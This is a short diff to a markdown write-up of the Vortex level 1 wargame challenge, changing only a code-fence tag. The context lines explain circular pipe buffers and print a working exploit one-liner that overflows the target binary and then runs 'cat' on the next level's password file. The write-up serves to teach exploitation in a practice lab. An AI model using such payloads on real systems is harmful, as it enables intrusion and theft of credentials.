@@ -49,8 +49,7 @@ To understand this, the following [article](http://www.pixelbeat.org/programming
 $ command1 | command2
 ```
 The idea is that the kernel uses 4096 bytes circular buffers (for stdin, stdout, and pipe). Being circular, the 4000 characters together with the existent content fill the buffer, and the next part of input does not contain an EOF and commands are executed. Actually, instead of the 4000 "A"s, we just need 4096-257-2-1=3836 extra characters:
-```
-bash
+```bash
 $ python -c 'print  "\\"*0x101+"\xcaA\n"+"A"*3836+"\nwhoami\ncat /etc/vortex_pass/vortex2"' |/vortex/vortex1
 $ $ vortex2
 $ ******
